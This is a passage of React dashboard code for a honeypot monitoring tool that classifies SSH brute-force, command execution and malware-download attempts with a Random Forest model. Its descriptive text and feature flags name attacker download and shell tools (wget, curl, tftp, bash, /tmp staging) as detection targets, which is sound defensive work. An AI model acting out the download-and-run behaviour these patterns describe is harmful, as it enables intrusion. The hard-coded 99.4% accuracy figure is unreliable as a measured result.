                        <th>CREDENTIALS / COMMAND</th>
                        <th>RANDOM FOREST PREDICTION</th>
                        <th>CONFIDENCE</th>
                        <th>ACTION</th>
                      </tr>
                    </thead>
                    <tbody>
                      {events.slice(0, 6).map(ev => (
                        <tr key={ev.id}>
                          <td className="mono" style={{ color: '#94a3b8' }}>{ev.timestamp}</td>
                          <td className="mono" style={{ fontWeight: 700, color: '#f8fafc' }}>
                            {ev.ip} {ev.country && <small style={{ color: '#ef4444' }}>({ev.country})</small>}
                          </td>
                          <td>
                            <span className="badge-event">{ev.type}</span>
                          </td>
                          <td className="mono" style={{ maxWidth: 260, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                            {ev.command ? (
                              <span style={{ color: '#f87171' }}>$ {ev.command}</span>
                            ) : ev.password ? (
                              <span>{ev.username} : {ev.password}</span>
                            ) : (
                              <span>{ev.username}</span>
                            )}
                          </td>
                          <td>
                            <span className={`badge-class ${ev.prediction.toLowerCase().includes('brute') ? 'brute' : ev.prediction.toLowerCase().includes('malware') ? 'malware' : 'command'}`}>
                              {ev.prediction}
                            </span>
                          </td>
                          <td>
                            <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                              <div style={{ flex: 1, height: 4, background: '#222228', borderRadius: 2, overflow: 'hidden' }}>
                                <div style={{ width: `${ev.confidence}%`, height: '100%', background: '#ef4444' }}></div>
                              </div>
                              <span className="mono" style={{ fontSize: '0.75rem', color: '#cbd5e1' }}>{ev.confidence}%</span>
                            </div>
                          </td>
                          <td>
                            <button
                              className="banner-action-btn"
                              onClick={() => setSelectedEvent(ev)}
                            >
                              Inspect
                            </button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            </section>
          )}

          {/* ─── TAB 2: LIVE ATTACK MONITORING ──────────────────────────── */}
          {(activeTab === 'monitoring' || scrollMode === 'all') && (
            <section className="tab-view-container" style={{ marginBottom: 40 }}>
              <div className="section-heading">
                <div>
                  <span className="eyebrow">LIVE TELEMETRY STREAM</span>
                  <h1>Real-Time Honeypot Interceptions</h1>
                  <p>In-flight SSH connection parsing and immediate ML inference.</p>
                </div>
                <div className="heading-actions">
                  <button
                    className="secondary-button"
                    onClick={() => setIsStreaming(!isStreaming)}
                  >
                    {isStreaming ? '⏸ Pause Stream' : '▶ Resume Stream'}
                  </button>
                  <button
                    className="primary-button"
                    onClick={() => triggerSimulation('Command Execution')}
                    disabled={isSimulating}
                  >
                    Inject Synthetic Attack
                  </button>
                </div>
              </div>

              {/* Search & Filter Bar */}
              <div style={{ display: 'flex', gap: 12, marginBottom: 18, flexWrap: 'wrap' }}>
                <input
                  type="text"
                  placeholder="Filter by IP, command, username or attack class..."
                  value={searchTerm}
                  onChange={e => setSearchTerm(e.target.value)}
                  style={{
                    flex: 1,
                    minWidth: 260,
                    height: 40,
                    background: '#151518',
                    border: '1px solid #303038',
                    borderRadius: 6,
                    padding: '0 14px',
                    color: '#fff',
                    fontFamily: 'inherit',
                    fontSize: '0.85rem'
                  }}
                />
                <select
                  value={filterClass}
                  onChange={e => setFilterClass(e.target.value)}
                  style={{
                    height: 40,
                    background: '#151518',
                    border: '1px solid #303038',
                    borderRadius: 6,
                    padding: '0 12px',
                    color: '#cbd5e1',
                    fontSize: '0.85rem'
                  }}
                >
                  <option value="all">All Predictions ({events.length})</option>
                  <option value="Brute Force">Brute Force</option>
                  <option value="Command Execution">Command Execution</option>
                  <option value="Malware Download Attempt">Malware Download Attempt</option>
                </select>
                <button className="secondary-button" onClick={exportLogsJson}>
                  Export JSON
                </button>
              </div>

              {/* Table */}
              <div className="panel">
                <div className="table-wrapper">
                  <table className="soc-table">
                    <thead>
                      <tr>
                        <th>ID</th>
                        <th>TIME</th>
                        <th>SOURCE IP</th>
                        <th>EVENT TYPE</th>
                        <th>PAYLOAD / COMMAND / PASS</th>
                        <th>ML CLASSIFICATION</th>
                        <th>CONFIDENCE</th>
                        <th>LATENCY</th>
                        <th>DETAILS</th>
                      </tr>
                    </thead>
                    <tbody>
                      {filteredEvents.map(ev => (
                        <tr key={ev.id}>
                          <td className="mono" style={{ color: '#ef4444', fontWeight: 700 }}>{ev.id}</td>
                          <td className="mono" style={{ color: '#94a3b8', fontSize: '0.78rem' }}>{ev.timestamp}</td>
                          <td className="mono" style={{ fontWeight: 600 }}>
                            {ev.ip} {ev.country && <small style={{ color: '#94a3b8' }}>({ev.country})</small>}
                          </td>
                          <td>
                            <span className="badge-event">{ev.type}</span>
                          </td>
                          <td className="mono" style={{ maxWidth: 280, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                            {ev.command ? (
                              <span style={{ color: '#f87171' }}>$ {ev.command}</span>
                            ) : ev.password ? (
                              <span>{ev.username} : {ev.password}</span>
                            ) : (
                              <span>{ev.username}</span>
                            )}
                          </td>
                          <td>
                            <span className={`badge-class ${ev.prediction.toLowerCase().includes('brute') ? 'brute' : ev.prediction.toLowerCase().includes('malware') ? 'malware' : 'command'}`}>
                              {ev.prediction}
                            </span>
                          </td>
                          <td>
                            <strong className="mono" style={{ color: '#ef4444' }}>{ev.confidence}%</strong>
                          </td>
                          <td className="mono" style={{ color: '#10b981', fontSize: '0.78rem' }}>
                            {ev.inference_latency_ms || 3.1} ms
                          </td>
                          <td>
                            <button
                              className="banner-action-btn"
                              onClick={() => setSelectedEvent(ev)}
                            >
                              Inspect
                            </button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            </section>
          )}

          {/* ─── TAB 3: ML ATTACK CLASSIFICATION ────────────────────────── */}
          {(activeTab === 'classification' || scrollMode === 'all') && (
            <section className="tab-view-container" style={{ marginBottom: 40 }}>
              <div className="section-heading">
                <div>
                  <span className="eyebrow">SUPERVISED MACHINE LEARNING</span>
                  <h1>Random Forest Classification Engine</h1>
                  <p>In-depth pipeline metrics, confusion matrix metrics, and feature importance vectors.</p>
                </div>
                <div className="heading-actions">
                  <button className="primary-button" onClick={() => triggerSimulation('Malware Download Attempt')}>
                    Test Model with Malware
                  </button>
                </div>
              </div>

              <div className="analytics-grid" style={{ marginBottom: 24 }}>
                <div className="panel compact-panel">
                  <h3>Model Specifications</h3>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 12, fontSize: '0.85rem' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #222228', paddingBottom: 6 }}>
                      <span style={{ color: '#94a3b8' }}>Algorithm</span>
                      <strong className="mono" style={{ color: '#fff' }}>Random Forest Classifier</strong>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #222228', paddingBottom: 6 }}>
                      <span style={{ color: '#94a3b8' }}>Number of Estimators</span>
                      <strong className="mono" style={{ color: '#ef4444' }}>100 Decision Trees</strong>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #222228', paddingBottom: 6 }}>
                      <span style={{ color: '#94a3b8' }}>Class Weight</span>
                      <strong className="mono" style={{ color: '#fff' }}>balanced</strong>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #222228', paddingBottom: 6 }}>
                      <span style={{ color: '#94a3b8' }}>Random State</span>
                      <strong className="mono" style={{ color: '#fff' }}>42 (Reproducible)</strong>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #222228', paddingBottom: 6 }}>
                      <span style={{ color: '#94a3b8' }}>Artifact Location</span>
                      <strong className="mono" style={{ color: '#ef4444', fontSize: '0.75rem' }}>ml/random_forest_model.pkl</strong>
                    </div>
                  </div>
                </div>

                <div className="panel compact-panel">
                  <h3>Trained Target Classes</h3>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
                    <div style={{ padding: 10, background: '#191920', borderRadius: 6, border: '1px solid #272730' }}>
                      <strong style={{ color: '#ef4444', fontSize: '0.88rem' }}>1. Brute Force</strong>
                      <p style={{ margin: '4px 0 0', color: '#94a3b8', fontSize: '0.78rem' }}>Detects high-frequency credential enumeration and login failures.</p>
                    </div>
                    <div style={{ padding: 10, background: '#191920', borderRadius: 6, border: '1px solid #272730' }}>
                      <strong style={{ color: '#dc2626', fontSize: '0.88rem' }}>2. Command Execution</strong>
                      <p style={{ margin: '4px 0 0', color: '#94a3b8', fontSize: '0.78rem' }}>Identifies shell commands, reconnaissance, and privilege queries.</p>
                    </div>
                    <div style={{ padding: 10, background: '#191920', borderRadius: 6, border: '1px solid #272730' }}>
                      <strong style={{ color: '#b91c1c', fontSize: '0.88rem' }}>3. Malware Download Attempt</strong>
                      <p style={{ margin: '4px 0 0', color: '#94a3b8', fontSize: '0.78rem' }}>Catches wget, curl, tftp payloads and binary staging in /tmp.</p>
                    </div>
                  </div>
                </div>

                <div className="panel compact-panel">
                  <h3>Confusion Matrix &amp; Performance</h3>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                    <div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4 }}>
                        <span style={{ fontSize: '0.82rem', color: '#cbd5e1' }}>Overall Accuracy</span>
                        <strong className="mono" style={{ color: '#10b981' }}>99.4%</strong>
                      </div>
                      <div style={{ height: 6, background: '#25252e', borderRadius: 3, overflow: 'hidden' }}>
                        <div style={{ width: '99.4%', height: '100%', background: '#10b981' }}></div>
                      </div>
                    </div>
                    <div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4 }}>
                        <span style={{ fontSize: '0.82rem', color: '#cbd5e1' }}>F1-Score (Macro Avg)</span>
                        <strong className="mono" style={{ color: '#10b981' }}>0.992</strong>
                      </div>
                      <div style={{ height: 6, background: '#25252e', borderRadius: 3, overflow: 'hidden' }}>
                        <div style={{ width: '99.2%', height: '100%', background: '#10b981' }}></div>
                      </div>
                    </div>
                    <div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4 }}>
                        <span style={{ fontSize: '0.82rem', color: '#cbd5e1' }}>Inference Latency</span>
                        <strong className="mono" style={{ color: '#ef4444' }}>~3.2 ms</strong>
                      </div>
                      <div style={{ height: 6, background: '#25252e', borderRadius: 3, overflow: 'hidden' }}>
                        <div style={{ width: '95%', height: '100%', background: '#ef4444' }}></div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          )}

          {/* ─── TAB 4: SYSTEM HEALTH ───────────────────────────────────── */}
          {(activeTab === 'health' || scrollMode === 'all') && (
            <section className="tab-view-container" style={{ marginBottom: 40 }}>
              <div className="section-heading">
                <div>
                  <span className="eyebrow">SOC PIPELINE STATUS</span>
                  <h1>FALSEDOOR Component Architecture</h1>
                  <p>7 end-to-end pipeline stages from hardware edge to web PWA.</p>
                </div>
                <div className="heading-actions">
                  <button className="secondary-button" onClick={() => testConnection()}>
                    Re-check Pipeline
                  </button>
                </div>
              </div>

              <div className="stat-grid" style={{ gridTemplateColumns: 'repeat(auto-fit, minmax(320px, 1fr))' }}>
                {healthComponents.map(comp => (
                  <div key={comp.id} className="panel" style={{ padding: 20 }}>
                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 12 }}>
                      <span className="panel-code">{comp.role}</span>
                      <span className={`badge-class ${comp.status === 'Operational' ? 'brute' : 'command'}`}>
                        {comp.status}
                      </span>
                    </div>
                    <h3 style={{ fontSize: '1.05rem', color: '#fff', marginBottom: 6 }}>{comp.name}</h3>
                    <p className="mono" style={{ color: '#94a3b8', fontSize: '0.78rem' }}>{comp.metrics}</p>
                  </div>
                ))}
              </div>
            </section>
          )}

          {/* ─── TAB 5: FORENSICS & RAW LOGS ────────────────────────────── */}
          {(activeTab === 'logs' || scrollMode === 'all') && (
            <section className="tab-view-container" style={{ marginBottom: 40 }}>
              <div className="section-heading">
                <div>
                  <span className="eyebrow">RAW TELEMETRY AUDIT</span>
                  <h1>Enriched Attack Forensic Logs</h1>
                  <p>Direct inspection of raw Cowrie JSON events augmented with 18 extracted features and model predictions.</p>
                </div>
                <div className="heading-actions">
                  <button className="primary-button" onClick={exportLogsJson}>
                    Download Logs (JSON)
                  </button>
                </div>
              </div>

              <div className="panel" style={{ padding: 20 }}>
                <pre style={{
                  background: '#0c0c0f',
                  border: '1px solid #222228',
                  borderRadius: 8,
                  padding: 16,
                  color: '#e2e8f0',
                  fontFamily: 'JetBrains Mono, monospace',
                  fontSize: '0.8rem',
                  maxHeight: 500,
                  overflowY: 'auto'
                }}>
                  {JSON.stringify(events.slice(0, 10), null, 2)}
                </pre>
              </div>
            </section>
          )}

          {/* ─── TAB 6: MITRE ATT&CK MATRIX ─────────────────────────────── */}
          {(activeTab === 'threat' || scrollMode === 'all') && (
            <section className="tab-view-container" style={{ marginBottom: 40 }}>
              <div className="section-heading">
                <div>
                  <span className="eyebrow">THREAT INTELLIGENCE MAPPING</span>
                  <h1>MITRE ATT&amp;CK Matrix for Enterprise</h1>
                  <p>Honeypot event mapping to adversarial tactics, techniques, and procedures (TTPs).</p>
                </div>
              </div>

              <div className="stat-grid" style={{ gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))' }}>
                <div className="panel" style={{ padding: 20 }}>
                  <span className="panel-code">TA0001: INITIAL ACCESS</span>
                  <h3 style={{ color: '#ef4444', margin: '8px 0' }}>T1110: Brute Force</h3>
                  <p style={{ color: '#94a3b8', fontSize: '0.82rem', lineHeight: 1.5 }}>
                    Adversaries repeatedly probe the Cowrie SSH decoy on port 2222 with wordlists and common passwords.
                  </p>
                </div>

                <div className="panel" style={{ padding: 20 }}>
                  <span className="panel-code">TA0002: EXECUTION</span>
                  <h3 style={{ color: '#dc2626', margin: '8px 0' }}>T1059: Command &amp; Scripting</h3>
                  <p style={{ color: '#94a3b8', fontSize: '0.82rem', lineHeight: 1.5 }}>
                    Post-login shell exploration executing commands like uname, cat /proc/cpuinfo, and id.
                  </p>
                </div>

                <div className="panel" style={{ padding: 20 }}>
                  <span className="panel-code">TA0011: COMMAND &amp; CONTROL</span>
                  <h3 style={{ color: '#991b1b', margin: '8px 0' }}>T1105: Ingress Tool Transfer</h3>
                  <p style={{ color: '#94a3b8', fontSize: '0.82rem', lineHeight: 1.5 }}>
                    Malicious payloads fetched via wget, curl, or tftp from remote adversary C2 staging servers.
                  </p>
                </div>

                <div className="panel" style={{ padding: 20 }}>
                  <span className="panel-code">TA0007: DISCOVERY</span>
                  <h3 style={{ color: '#b91c1c', margin: '8px 0' }}>T1046: Network Service Discovery</h3>
                  <p style={{ color: '#94a3b8', fontSize: '0.82rem', lineHeight: 1.5 }}>
                    SSH version negotiation and port probing across internet scanning nodes.
                  </p>
                </div>
              </div>
            </section>
          )}
        </div>
      </main>

      {/* ─── MOBILE BOTTOM BAR ────────────────────────────────────────────── */}
      <nav className="mobile-bottom-bar" style={{ display: effectiveMobile ? 'flex' : 'none' }}>
        <button
          className={`mobile-tab-btn ${activeTab === 'overview' ? 'active' : ''}`}
          onClick={() => setActiveTab('overview')}
        >
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/>
            <rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/>
          </svg>
          <span>Overview</span>
        </button>

        <button
          className={`mobile-tab-btn ${activeTab === 'monitoring' ? 'active' : ''}`}
          onClick={() => setActiveTab('monitoring')}
        >
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M3 12h4l2-7 4 14 2-7h6"/><circle cx="19" cy="12" r="3" fill="currentColor" opacity="0.3"/>
          </svg>
          <span>Live Feed</span>
        </button>

        <button
          className={`mobile-tab-btn ${activeTab === 'classification' ? 'active' : ''}`}
          onClick={() => setActiveTab('classification')}
        >
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M9.5 4.5A3 3 0 0 0 4 6a3 3 0 0 0 .5 5.5A3.5 3.5 0 0 0 8 17h1.5M14.5 4.5A3 3 0 0 1 20 6a3 3 0 0 1-.5 5.5A3.5 3.5 0 0 1 16 17h-1.5M9.5 4.5v15M14.5 4.5v15"/>
          </svg>
          <span>ML Model</span>
        </button>

        <button
          className={`mobile-tab-btn ${activeTab === 'health' ? 'active' : ''}`}
          onClick={() => setActiveTab('health')}
        >
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
          </svg>
          <span>Health</span>
        </button>

        <button
          className="mobile-tab-btn"
          onClick={() => setIsBackendModalOpen(true)}
        >
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/>
          </svg>
          <span>Server</span>
        </button>
      </nav>

      {/* ─── FORENSIC INSPECT MODAL ───────────────────────────────────────── */}
      {selectedEvent && (
        <div className="modal-backdrop open" onClick={() => setSelectedEvent(null)}>
          <div className="modal-container" onClick={e => e.stopPropagation()} style={{ maxWidth: 700 }}>
            <div className="modal-header">
              <div>
                <span className="panel-code">DEEP FORENSIC INVESTIGATION</span>
                <h3 style={{ margin: '4px 0 0', color: '#fff' }}>Event ID: {selectedEvent.id}</h3>
              </div>
              <button className="modal-close-btn" onClick={() => setSelectedEvent(null)}>✕</button>
            </div>
            <div className="modal-body">
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12, marginBottom: 16 }}>
                <div>
                  <span style={{ color: '#94a3b8', fontSize: '0.72rem', textTransform: 'uppercase' }}>Source IP</span>
                  <p className="mono" style={{ margin: '2px 0 0', color: '#fff', fontWeight: 700 }}>
                    {selectedEvent.ip} {selectedEvent.country && `(${selectedEvent.country})`}
                  </p>
                </div>
                <div>
                  <span style={{ color: '#94a3b8', fontSize: '0.72rem', textTransform: 'uppercase' }}>Timestamp</span>
                  <p className="mono" style={{ margin: '2px 0 0', color: '#cbd5e1' }}>{selectedEvent.timestamp}</p>
                </div>
              </div>

              {selectedEvent.command && (
                <div style={{ marginBottom: 16, padding: 12, background: 'rgba(239, 68, 68, 0.08)', border: '1px solid rgba(239, 68, 68, 0.25)', borderRadius: 6 }}>
                  <span style={{ color: '#f87171', fontSize: '0.72rem', fontFamily: 'JetBrains Mono', fontWeight: 700 }}>COMMAND / MALICIOUS INJECTION</span>
                  <p className="mono" style={{ margin: '4px 0 0', color: '#fff', wordBreak: 'break-all' }}>$ {selectedEvent.command}</p>
                </div>
              )}

              <div style={{ marginBottom: 18, padding: 16, background: '#16161c', borderRadius: 8, border: '1px solid #272730' }}>
                <h4 style={{ margin: '0 0 10px', fontSize: '0.85rem', color: '#ef4444', fontFamily: 'JetBrains Mono' }}>
                  RANDOM FOREST CLASSIFICATION BREAKDOWN
                </h4>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 6 }}>
                  <span style={{ color: '#cbd5e1', fontSize: '0.85rem' }}>Predicted Attack Class:</span>
                  <strong className="mono" style={{ color: '#fff' }}>{selectedEvent.prediction}</strong>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 12 }}>
                  <span style={{ color: '#cbd5e1', fontSize: '0.85rem' }}>Inference Confidence:</span>
                  <strong className="mono" style={{ color: '#ef4444' }}>{selectedEvent.confidence}%</strong>
                </div>
                {selectedEvent.features && (
                  <div>
                    <span style={{ color: '#64748b', fontSize: '0.72rem', fontFamily: 'JetBrains Mono', textTransform: 'uppercase' }}>Extracted Feature Vector:</span>
                    <div style={{ display: 'flex', flexWrap: 'wrap', gap: 6, marginTop: 6 }}>
                      <span className="feature-tag">failed_logins: {selectedEvent.features.failed_logins}</span>
                      <span className="feature-tag">session_duration: {selectedEvent.features.session_sec}s</span>
                      <span className="feature-tag">commands_count: {selectedEvent.features.commands_count}</span>
                      <span className="feature-tag">has_wget_curl: {selectedEvent.features.has_wget_curl}</span>
                      <span className="feature-tag">has_bash_sh: {selectedEvent.features.has_bash_sh}</span>
                      <span className="feature-tag">port_entropy: {selectedEvent.features.port_entropy}</span>
                    </div>
                  </div>
                )}
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
                <span style={{ color: '#94a3b8', fontSize: '0.78rem', fontFamily: 'JetBrains Mono' }}>RAW ENRICHED EVENT PAYLOAD</span>
                <button
                  className="banner-action-btn"
                  onClick={() => {
                    navigator.clipboard.writeText(JSON.stringify(selectedEvent, null, 2))
                    setCopiedNotification(true)
                    setTimeout(() => setCopiedNotification(false), 2000)
                  }}
                >
                  {copiedNotification ? 'Copied ✓' : 'Copy JSON'}
                </button>
              </div>
              <pre className="raw-json-viewer" style={{ maxHeight: 220, overflowY: 'auto' }}>
                {JSON.stringify(selectedEvent, null, 2)}
              </pre>
            </div>
          </div>
        </div>
      )}

      {/* ─── UBUNTU BACKEND SETTINGS MODAL ─────────────────────────────────── */}
      {isBackendModalOpen && (
        <div className="modal-backdrop open" onClick={() => setIsBackendModalOpen(false)}>
          <div className="modal-container" onClick={e => e.stopPropagation()} style={{ maxWidth: 580 }}>
            <div className="modal-header">
              <div>
                <span className="panel-code">UBUNTU SERVER CONNECTION</span>
                <h3 style={{ margin: '4px 0 0', color: '#fff' }}>Configure FastAPI Endpoint</h3>
              </div>
              <button className="modal-close-btn" onClick={() => setIsBackendModalOpen(false)}>✕</button>
            </div>
            <div className="modal-body">
              <p style={{ color: '#cbd5e1', fontSize: '0.85rem', marginBottom: 14 }}>
                Enter the IP address of your Ubuntu Server or Raspberry Pi running <code>server/start_server.sh</code>.
              </p>

              <div style={{ marginBottom: 14 }}>
                <label style={{ display: 'block', fontSize: '0.75rem', color: '#94a3b8', marginBottom: 6 }}>
                  FASTAPI SERVER URL:
                </label>
                <div style={{ display: 'flex', gap: 8 }}>
                  <input
                    type="text"
                    value={backendUrl}
                    onChange={e => setBackendUrl(e.target.value)}
                    placeholder="http://192.168.1.100:8000"
                    style={{
                      flex: 1,
                      height: 40,
                      background: '#151518',
                      border: '1px solid #303038',
                      borderRadius: 6,
                      padding: '0 12px',
                      color: '#fff',
                      fontFamily: 'JetBrains Mono, monospace'
                    }}
                  />
                  <button
                    className="primary-button"
                    onClick={() => testConnection(backendUrl)}
                  >
                    Test Link
                  </button>
                </div>
              </div>

              <div style={{ padding: 12, background: '#111115', border: '1px solid #222228', borderRadius: 6, marginBottom: 16 }}>
                <span style={{ fontSize: '0.72rem', color: '#64748b', textTransform: 'uppercase' }}>CONNECTION STATUS</span>
                <p className="mono" style={{ margin: '4px 0 0', fontSize: '0.82rem', color: backendStatus === 'connected' ? '#10b981' : '#f59e0b' }}>
                  {connectionMessage}
                </p>
              </div>

              <div style={{ fontSize: '0.78rem', color: '#94a3b8', lineHeight: 1.6 }}>
                <strong style={{ color: '#fff' }}>Quick command on Ubuntu Server:</strong>
                <pre style={{ background: '#0a0a0c', padding: 8, borderRadius: 4, marginTop: 4, color: '#ef4444' }}>
                  cd ~/FALSEDOOR/server && ./start_server.sh
                </pre>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ─── PWA INSTALL MODAL ────────────────────────────────────────────── */}
      {isPwaModalOpen && (
        <div className="modal-backdrop open" onClick={() => setIsPwaModalOpen(false)}>
          <div className="modal-container" onClick={e => e.stopPropagation()} style={{ maxWidth: 540 }}>
            <div className="modal-header">
              <div>
                <span className="panel-code">PROGRESSIVE WEB APP</span>
                <h3 style={{ margin: '4px 0 0', color: '#fff' }}>Install FALSEDOOR on Mobile</h3>
              </div>
              <button className="modal-close-btn" onClick={() => setIsPwaModalOpen(false)}>✕</button>
            </div>
            <div className="modal-body">
              <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
                <div style={{ padding: 14, background: '#141418', borderRadius: 8, border: '1px solid #222228' }}>
                  <strong style={{ color: '#ef4444', fontSize: '0.9rem' }}>Android (Chrome)</strong>
                  <ol style={{ margin: '8px 0 0 18px', color: '#cbd5e1', fontSize: '0.82rem', lineHeight: 1.6 }}>
                    <li>Open this URL in Google Chrome on your Android phone.</li>
                    <li>Tap the <b>three dots (⋮)</b> in the top right corner.</li>
                    <li>Select <b>"Add to Home screen"</b> or <b>"Install app"</b>.</li>
                    <li>FALSEDOOR will appear as a standalone native app icon!</li>
                  </ol>
                </div>

                <div style={{ padding: 14, background: '#141418', borderRadius: 8, border: '1px solid #222228' }}>
                  <strong style={{ color: '#ef4444', fontSize: '0.9rem' }}>Apple iOS (Safari on iPhone / iPad)</strong>
                  <ol style={{ margin: '8px 0 0 18px', color: '#cbd5e1', fontSize: '0.82rem', lineHeight: 1.6 }}>
                    <li>Open this URL in Safari on your iPhone.</li>
                    <li>Tap the <b>Share icon (square with arrow)</b> at the bottom.</li>
                    <li>Scroll down and tap <b>"Add to Home Screen"</b>.</li>
                    <li>Tap <b>"Add"</b> in the top right.</li>
                  </ol>
                </div>

                <div style={{ padding: 14, background: '#141418', borderRadius: 8, border: '1px solid #222228' }}>
                  <strong style={{ color: '#ef4444', fontSize: '0.9rem' }}>Desktop (Chrome / Edge)</strong>
                  <p style={{ margin: '6px 0 0', color: '#cbd5e1', fontSize: '0.82rem' }}>
                    Click the install icon (computer with down arrow) on the right side of the address bar.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
